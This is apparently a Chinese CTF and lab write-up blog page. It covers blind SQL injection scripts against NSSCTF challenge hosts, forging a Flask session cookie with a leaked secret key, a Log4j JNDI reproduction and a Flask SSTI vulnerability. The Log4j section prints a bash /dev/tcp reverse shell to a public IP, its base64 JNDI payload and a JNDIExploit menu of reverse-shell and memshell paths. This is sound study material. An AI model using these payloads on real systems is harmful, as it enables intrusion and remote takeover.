<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28612&#x27;</span></span><br><span class="line"></span><br><span class="line">paylaod_list = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paylaod_list:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;i&#125;</span>%&#x27;#&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        re = requests.post(url,data = data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong password&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28612&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zifu=<span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(zifu)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> zifu:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag+i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240724212618274.png" alt="image-20240724212618274"></p>
<h2 id="NSSRound-13-Basic-flask-jwt-1"><a href="#NSSRound-13-Basic-flask-jwt-1" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>æ³¨å†Œè´¦å·è¿›å»æ‹¿flag</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210036935.png" alt="image-20240727210036935"></p>
<p>å¿˜è®°å¯†ç å¤„æœ‰secretkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240727210155883.png" alt="image-20240727210155883"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210408582.png" alt="image-20240727210408582"></p>
<p>ç›´æ¥æ‹¿å»è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s &quot;th3f1askisfunny&quot; -c &quot;.eJwlzsENwzAIAMBd_O7DwQZMlonAgNqv07yq7t5IneDuU45ccT7L_l5XPMrx8rKX0ZVhcDK1FAgCaBLYK_lskDMMJ4ZvDFWydUBB28CmW3LL2kRJtM9qJoiJZAQdYPTgUNdpLIQ-whSpsjM3F8esyqY3wLOWO3Kdsf4bKN8frIcvsQ.ZqTwRQ.gQDifRFlzKt9DirA8xhKUx8c45E&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727210430001.png" alt="image-20240727210430001"></p>
<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸€ä¸‹ï¼Œadminçš„idå±æ€§ç›´æ¥ç›²çŒœ1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;84a7287f763f92e62239e5406dc32fceb5c5ed17209f342595b12bcdbf73f039a69a4c0bb955f56b6242284e7eadacb7965d8eba5607d773d9d5f0a7badc37c0&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240727210937825.png" alt="image-20240727210937825"></p>
<p>æ›¿æ¢cookieæ‹¿flag</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240727211017752.png" alt="image-20240727211017752"></p>
<h2 id="ç™»é™†å°±æœ‰flag-1"><a href="#ç™»é™†å°±æœ‰flag-1" class="headerlink" title="ç™»é™†å°±æœ‰flag"></a>ç™»é™†å°±æœ‰flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br></pre></td></tr></table></figure>

<p><strong>ç©ºå¼‚æˆ–0ä¼šæŸ¥åˆ°æ‰€æœ‰éæ•°å­—å¼€å¤´çš„è®°å½•</strong></p>
<p>å¼•å·å¯ä»¥ç”¨äºé—­åˆï¼Œäº•å·å¯ä»¥ç”¨äºæ³¨é‡Šï¼Œ^è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç­‰å·å°±æ˜¯åˆ¤ç­‰</p>
<h2 id="Log4jå¤ç°-1"><a href="#Log4jå¤ç°-1" class="headerlink" title="Log4jå¤ç°"></a>Log4jå¤ç°</h2><p><strong>å‰ç½®çŸ¥è¯†</strong><br><strong>LDAP</strong><br>è½»é‡çº§çš„ç›®å½•æœå¯»åè®®ï¼Œæä¾›ç›®å½•æœåŠ¡</p>
<p><strong>JNDI</strong><br>Javaçš„ä¸€ä¸ªæ¥å£ï¼ŒJNDIé¿å…äº†ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„ç´§è€¦åˆ</p>
<p>æˆ‘ä»¬å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† Active Directoryã€OpenLDAP è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨</p>
<p><strong>dnslog</strong><br>Aè®°å½•ï¼šAddress åŸŸåå¯¹åº”çš„IPåœ°å€</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sunny11/p/14399420.html">https://www.cnblogs.com/sunny11/p/14399420.html</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807192941789.png" alt="image-20240807192941789"></p>
<p>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://r0303l.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807193103537.png" alt="image-20240807193103537"></p>
<p>å­˜åœ¨ç›¸å…³æ¼æ´</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807193111668.png" alt="image-20240807193111668"></p>
<p>log4jä¼šè®°å½•æ•°æ®åŒ…çš„ä¸€äº›å†…å®¹ï¼ˆæ¯”å¦‚urlã€cookieç­‰ç­‰ï¼‰ï¼Œæ­¤å¤–ï¼Œä»–è¿˜æ‹¥æœ‰ä¸€å®šæ•°æ®åˆ†æå¤„ç†èƒ½åŠ›ï¼Œè¿™ç§èƒ½åŠ›èƒ½å¤Ÿç®€åŒ–ç¨‹åºå‘˜çš„å¼€å‘ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†log4jçš„è¿™ä¸ªæ¼æ´ã€‚</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/af2678fe032fc71d16d913d38f6535dd.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># java -jar JNDIExploit-1.2-SNAPSHOT.jar -h</span></span><br><span class="line">Usage: java -jar JNDIExploit-1.2-SNAPSHOT.jar [options]</span><br><span class="line">  Options:</span><br><span class="line">  * -i, --ip       Local ip address</span><br><span class="line">    -l, --ldapPort Ldap <span class="built_in">bind</span> port (default: 1389)</span><br><span class="line">    -p, --httpPort Http <span class="built_in">bind</span> port (default: 8080)</span><br><span class="line">    -u, --usage    Show usage (default: <span class="literal">false</span>)</span><br><span class="line">    -h, --<span class="built_in">help</span>     Show this <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</span></span><br><span class="line">Supported LADP Queriesï¼š</span><br><span class="line">* all words are <span class="keyword">case</span> INSENSITIVE when send to ldap server</span><br><span class="line"></span><br><span class="line">[+] Basic Queries: ldap://null:1389/Basic/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://null:1389/Basic/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/Basic/Command/[cmd]</span><br><span class="line">    ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/Basic/TomcatEcho</span><br><span class="line">    ldap://null:1389/Basic/SpringEcho</span><br><span class="line">    ldap://null:1389/Basic/WeblogicEcho</span><br><span class="line">    ldap://null:1389/Basic/TomcatMemshell1</span><br><span class="line">    ldap://null:1389/Basic/TomcatMemshell2  ---need extra header [shell: <span class="literal">true</span>]</span><br><span class="line">    ldap://null:1389/Basic/JettyMemshell</span><br><span class="line">    ldap://null:1389/Basic/WeblogicMemshell1</span><br><span class="line">    ldap://null:1389/Basic/WeblogicMemshell2</span><br><span class="line">    ldap://null:1389/Basic/JBossMemshell</span><br><span class="line">    ldap://null:1389/Basic/WebsphereMemshell</span><br><span class="line">    ldap://null:1389/Basic/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] Deserialize Queries: ldap://null:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://null:1389/Deserialization/URLDNS/[domain]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsBeanutils2/TomcatEcho</span><br><span class="line">    ldap://null:1389/Deserialization/C3P0/SpringEcho</span><br><span class="line">    ldap://null:1389/Deserialization/Jdk7u21/WeblogicEcho</span><br><span class="line">    ldap://null:1389/Deserialization/Jre8u20/TomcatMemshell</span><br><span class="line">    ldap://null:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1</span><br><span class="line">    ldap://null:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells</span><br><span class="line"></span><br><span class="line">[+] TomcatBypass Queries</span><br><span class="line">    ldap://null:1389/TomcatBypass/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/TomcatBypass/Command/[cmd]</span><br><span class="line">    ldap://null:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatEcho</span><br><span class="line">    ldap://null:1389/TomcatBypass/SpringEcho</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatMemshell1</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: <span class="literal">true</span>]</span><br><span class="line">    ldap://null:1389/TomcatBypass/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] GroovyBypass Queries</span><br><span class="line">    ldap://null:1389/GroovyBypass/Command/[cmd]</span><br><span class="line">    ldap://null:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line"></span><br><span class="line">[+] WebsphereBypass Queries</span><br><span class="line">    ldap://null:1389/WebsphereBypass/List/file=[file or directory]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Command/[cmd]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/WebsphereMemshell</span><br><span class="line">    ldap://null:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</span><br><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>å…ˆå°†åå¼¹shellçš„å‘½ä»¤base64ç¼–ç ï¼Œç„¶åå°†é‡Œé¢çš„+å·å’Œ&#x3D;å·è¿›è¡Œä¸€æ¬¡urlç¼–ç </p>
<p>æ³¨ï¼šIPå¡«vpså…¬ç½‘ipï¼ŒPORTè¦å’Œncç›‘å¬çš„ç«¯å£å¯¹åº”</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/IP/</span><span class="variable constant_">PORT</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/101.37.27.18/</span><span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment"># =&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx</span></span><br><span class="line"><span class="comment"># =&gt; YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯åŠ¨JNDIExploit</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDIExploit-1.2-SNAPSHOT.jar </span>-i <span class="number">101</span>.<span class="number">37</span>.<span class="number">27</span>.<span class="number">18</span> -l <span class="number">1389</span> -p <span class="number">8180</span></span><br></pre></td></tr></table></figure>

<p>ç”¨ncç›‘å¬ç«¯å£</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://101.37.27.18:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx&#125;</span><br></pre></td></tr></table></figure>

<p>ç»ˆç«¯1</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201100972.png" alt="image-20240807201100972"></p>
<p>ç»ˆç«¯2</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201111841.png" alt="image-20240807201111841"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201133456.png" alt="image-20240807201133456"></p>
<h2 id="å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰-1"><a href="#å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰-1" class="headerlink" title="å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰"></a>å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app,</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">    default_limits=[<span class="string">&quot;10000 per hour&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e&quot;</span>)%<span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&quot;/app/flag.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        query = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">        render_template_string(query)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Thank you for your input.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;No input found.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>å‘ç°Flask åº”ç”¨çš„ <code>check</code> è·¯ç”±å­˜åœ¨å®‰å…¨æ¼æ´ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&quot;/app/flag.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        query = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">        render_template_string(query)  <span class="comment"># æ­¤å¤„å­˜åœ¨ SSTI æ¼æ´</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Thank you for your input.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;No input found.&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>render_template_string(query)</code> å‡½æ•°ç›´æ¥æ¸²æŸ“äº†ç”¨æˆ·æä¾›çš„è¾“å…¥ï¼ˆ<code>query</code>ï¼‰ï¼Œå¯¼è‡´å­˜åœ¨ SSTI æ¼æ´ã€‚</p>
<p><code>render_template_string</code> æ˜¯ Flask æä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†æ¨¡æ¿å­—ç¬¦ä¸²æ¸²æŸ“ä¸ºæœ€ç»ˆçš„ HTML è¾“å‡ºã€‚å®ƒç±»ä¼¼äº <code>render_template</code>ï¼Œä½†åŒºåˆ«åœ¨äº <code>render_template</code> æ˜¯ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œè€Œ <code>render_template_string</code> æ˜¯ç›´æ¥æ¸²æŸ“ä¼ é€’ç»™å®ƒçš„å­—ç¬¦ä¸²ã€‚</p>
<h3 id="render-template-string-çš„å·¥ä½œåŸç†-1"><a href="#render-template-string-çš„å·¥ä½œåŸç†-1" class="headerlink" title="render_template_string çš„å·¥ä½œåŸç†"></a><code>render_template_string</code> çš„å·¥ä½œåŸç†</h3><p><code>render_template_string</code> ä¼šå°†ä¼ é€’ç»™å®ƒçš„æ¨¡æ¿å­—ç¬¦ä¸²ä¸ä¸Šä¸‹æ–‡å˜é‡è¿›è¡Œç»“åˆï¼Œç„¶åä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“æ¥æ¸²æŸ“å­—ç¬¦ä¸²å¹¶ç”Ÿæˆæœ€ç»ˆçš„ HTML è¾“å‡ºã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">    name = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">    template = <span class="string">&quot;Hello, &#123;&#123; name &#125;&#125;!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>render_template_string</code> å‡½æ•°å°†å­—ç¬¦ä¸² <code>&quot;Hello, &#123;&#123; name &#125;&#125;!&quot;</code> ä¸ä¸Šä¸‹æ–‡å˜é‡ <code>name</code> ç»“åˆ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807225003690.png" alt="image-20240807225003690"></p>
<h3 id="å¦‚ä½•å¯¼è‡´-SSTI-æ¼æ´-1"><a href="#å¦‚ä½•å¯¼è‡´-SSTI-æ¼æ´-1" class="headerlink" title="å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´"></a>å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´</h3><p>å½“ç”¨æˆ·è¾“å…¥ç›´æ¥ä¼ é€’ç»™ <code>render_template_string</code> è€Œä¸è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–éªŒè¯æ—¶ï¼Œå°±å¯èƒ½å¼•å‘æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ã€‚ä¾‹å¦‚ï¼š</p>
